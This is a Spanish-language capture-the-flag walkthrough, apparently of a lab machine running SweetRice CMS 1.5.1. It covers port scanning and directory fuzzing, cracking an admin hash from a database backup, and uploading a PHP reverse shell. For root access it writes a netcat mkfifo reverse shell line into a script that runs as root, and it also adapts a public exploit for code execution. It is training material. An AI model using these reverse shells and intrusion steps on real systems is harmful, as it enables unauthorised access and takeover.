  
Iniciamos la VPN
![[/Untitled 40.png|Untitled 40.png]]
![[/Untitled 1 6.png|Untitled 1 6.png]]
Iniciamos la maquina
![[/Untitled 2 7.png|Untitled 2 7.png]]
Confirmamos la conexión con la ip victima
![[/Untitled 3 7.png|Untitled 3 7.png]]
A continuación, procedemos a realizar un escaneo inicial para identificar los puertos abiertos y los servicios que están funcionando en la máquina.
sudo nmap -p- --open -sS --min-rate 5000 -v -n -Pn 10.10.96.204
![[/Untitled 4 6.png|Untitled 4 6.png]]
  
Vamos a hacer uso de la herramienta whatweb para obtener las tecnologias usadas en el servicio web. (Servidor, frameworks, etc…)
  
whatweb -v http://<IP_VICTIMA>/
  
Comenzamos poniendo la ip de la victima en el navegador para atacar al puerto 80
![[/Untitled 5 6.png|Untitled 5 6.png]]
  
Aplicamos fuzzing para ver si encontramos alguna ruta curiosa
ffuf -w directory-list-2.3-medium.txt -u [http://10.10.96.204/FUZZ](http://10.10.96.204/FUZZ) -c
  
En los casos que no encontramos nada interesante al fuzzear directorios, tenemos la opcion de fuzzear rutas con extension (ficheros).
  
- ffuf cheatsheet: [https://cheatsheet.haax.fr/web-pentest/tools/ffuf/](https://www.phrack.me/tools/2022/07/06/Ffuf-cheatsheet.html)
  
![[/Untitled 6 6.png|Untitled 6 6.png]]
  
En /content encontramos lo siguiente
![[/Untitled 7 6.png|Untitled 7 6.png]]
Nos encontramos con un SweetRice, haciendo una búsqueda encontramos que la versión 1.5.1 es vulnerable.
![[/Untitled 8 6.png|Untitled 8 6.png]]
NOTA: SweetRice es un sistema de gestión de contenido (CMS) de código abierto. Al igual que otros CMS, como WordPress, Joomla o Drupal, SweetRice permite a los usuarios crear, editar, gestionar y publicar contenido en un sitio web sin necesidad de tener conocimientos avanzados de programación.
  
Al no encontrar nada mas en la web ni en el código fuente, aplicamos fuzzing a content
![[/Untitled 9 6.png|Untitled 9 6.png]]
  
![[/Untitled 10 6.png|Untitled 10 6.png]]
Revisando todos los directorios hay dos que son interesantes
Los cuales son el de /inc
![[/Untitled 11 6.png|Untitled 11 6.png]]
  
Y el de /as
![[/Untitled 12 5.png|Untitled 12 5.png]]
  
En el directorio /inc nos encontramos con un directorio que parece ser un backup de la base de datos, donde pueden encontrarse usuarios y contraseñas
![[/Untitled 13 5.png|Untitled 13 5.png]]
Accedemos al directorio y nos descargamos el archivo para poder visualizarlo
![[/Untitled 14 4.png|Untitled 14 4.png]]
En el contenido del archivo nos encontramos con lo que parecen ser unas credenciales de administrador
  
![[/Untitled 15 3.png|Untitled 15 3.png]]
manager
42f749ade7f9e195bf475f37a44cafcb
Nos dirigimos a CrackStation para ver si podemos descifrar la contraseña
![[/Untitled 16 3.png|Untitled 16 3.png]]
Ya la tenemos, vamos a probar si podemos acceder con estas credenciales en el inicio de sesión encontrado anteriormente
![[/Untitled 17 3.png|Untitled 17 3.png]]
Hemos conseguido el acceso al inicio de sesion con las credenciales de manager y Password123
Comenzamos a inspeccionar la web
Podemos ver que la versión del SweetRice es la 1.5.1
![[/Untitled 18 3.png|Untitled 18 3.png]]
Encontramos un apartado en la web que nos deja introducir código php y se sube al directorio /inc , por lo que subiremos una reverse shell en php para obtener el acceso.
Nos vamos al generador de shell e indicamos para php en este caso
![[/Untitled 19 3.png|Untitled 19 3.png]]
Nos dirigimos al apartado Ads de la web para subir la reverse
![[/Untitled 20 3.png|Untitled 20 3.png]]
Al darle a done y dirigirnos al directorio /inc nos damos cuenta de que se crea el directorio ads y dentro de este se encuentra nuestra reverse shell
![[/Untitled 21 3.png|Untitled 21 3.png]]
![[/Untitled 22 3.png|Untitled 22 3.png]]
Nos ponemos en escucha en el puerto 4444 y en el directorio donde se encuentra la reverse la ejecutamos pinchando en el documento
![[/Untitled 23 3.png|Untitled 23 3.png]]
![[/Untitled 24 3.png|Untitled 24 3.png]]
![[/Untitled 25 3.png|Untitled 25 3.png]]
Accedemos a /home para ver si encontramos el usuario
Encontramos un usuario
![[/Untitled 26 3.png|Untitled 26 3.png]]
Le hacemos cat a user.txt y obtenemos la primera flag
![[/Untitled 27 3.png|Untitled 27 3.png]]
Nos faltaria solamente la flag de root
Hacemos un sudo -l para ver que podemos ejecutar como root y comenzar la escalada de privilegios
![[/Untitled 28 3.png|Untitled 28 3.png]]
  
Le hacemos un cat a [backup.pl](http://backup.pl) para ver que contiene
![[/Untitled 29 3.png|Untitled 29 3.png]]
Este fichero llama a un .sh, vamos a ver que contiene el fichero que ejecuta
![[/Untitled 30 3.png|Untitled 30 3.png]]
  
Comprobamos los permisos del fichero para ver si tenemos posibilidad de escribir en el.
ls -la /etc | grep copy.sh
  
![[/Untitled 31 3.png|Untitled 31 3.png]]
  
Parece que nos encontramos con una reverse shell que apunta a esa dirección ip, si podemos cambiar esa dirección a la nuestra podemos tener acceso como root.
Intentamos con nano cambiar el contenido del archivo
![[/Untitled 32 3.png|Untitled 32 3.png]]
No nos deja acceder con nano ni vi por lo que intentamos con un echo imprimir el mismo contenido con nuestra ip sobre el archivo copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.57 5556 >/tmp/f
![[/Untitled 33 3.png|Untitled 33 3.png]]
Nos ponemos en escucha en el puerto indicado (5556)
![[/Untitled 34 3.png|Untitled 34 3.png]]
Ejecutamos el comando encontrado en el sudo -l
![[/Untitled 35 3.png|Untitled 35 3.png]]
Ya escalamos los privilegios y somos root, vamos a por la bandera de root
![[/Untitled 36 2.png|Untitled 36 2.png]]
  
---
  
Segunda manera de introducir la reverse shell desde la web
![[/Untitled 8 6.png|Untitled 8 6.png]]
  
Creamos el exploit con el contenido que encontramos en exploit database, cambiando el contenido con nuestras necesidades
![[/Untitled 37 2.png|Untitled 37 2.png]]
![[/Untitled 38 2.png|Untitled 38 2.png]]
Cambios
![[/Untitled 39 2.png|Untitled 39 2.png]]
El host lo cortamos en content ya que encontramos esta parte del código, nos especifica donde guarda el documento
![[/Untitled 40 2.png|Untitled 40 2.png]]
Con estos cambios, ya es funcional el exploit, como vemos en el input donde especificamos el documento acepta php5, crearemos un documento en php5 que nos ejecute un whoami
![[Untitled 41.png]]
Ejecutamos el exploit
![[Untitled 42.png]]
Accedemos a la url señalada y comprobamos que tenemos RCE
![[Untitled 43.png]]
Modificamos el archivo shell.php y le añadimos una reverse shell
![[Untitled 44.png]]
Ejecutamos el exploit para resubir el archivo con la reverse shell
![[Untitled 45.png]]
Nos ponemos en escucha en el puerto indicado en la reverse shell (4444)
![[Untitled 46.png]]
Accedemos a la direccion donde se encuentra el archivo shell.php5 para que se ejecute la reverse shell
![[Untitled 47.png]]
Ya tendríamos el acceso